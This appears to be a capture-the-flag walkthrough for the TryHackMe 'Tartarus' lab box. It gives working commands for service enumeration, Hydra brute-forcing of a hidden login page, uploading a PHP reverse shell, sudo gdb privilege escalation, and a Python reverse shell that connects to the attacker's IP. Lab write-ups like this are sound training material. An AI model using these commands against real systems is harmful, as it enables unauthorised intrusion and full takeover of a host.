# TryHackMe_Tartarus
This is an beginner box based on simple enumeration of services and basic privilege escalation techniques.

The goal is to find user.txt and root.txt

# Gain access to the machine

Run nmap 

```
nmap -sC -sV -oN namp_results.txt
```

And you'll find three port open.

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.24.148
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

The FTP protocol has anonymous connection enable., so connect whith FTP and un 

```
ls -la
```

Notice a wierd folder named '...', follow the path to find the hidden login page.
To get some credentials, check the robots.txt, i wrote a python script to get the login (the one in the repo) but Hydra will do the job.

```
hydra -l enox -P credentials.txt {machine ip} http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!"
```

Once you logged in you can upload a file,
i suggest a php reverse shell,
use gobuster to find where is located the rev shell

```
gobuster dir -u {machine ip}/sUp3r-s3cr3t/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Once you find the reverse shell set up a listener

```
nc -lnvp {the port in the rev shell file}
```

and then make the shell stable

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

# User escalation

Ok now we are in, let's check if there's a SUID to escalate

```
sudo -l
```

You can see that gdb is runnable wothout password, use GTFOBins (great site!) to escalate.

```
sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
```

Now you are thirtytwo.

# Root escalation

Look around in the /home directory and you'll see a cleanup.py file, this file can be run as root.
Let's edit th file with 

```
nano cleanup.py
```

and replace the content with 
```
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("{your ip}",{any port you want}));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

on your machine setup another listener with the port you choose and BOOM!, you are root.

# Find the flags

Run the two following commands

```
find / -name 'user.txt' 2>/dev/null
```
and
```
find / -name 'root.txt' 2>/dev/null
```
 and you're done!
 
 # CONGRATULATIONS!
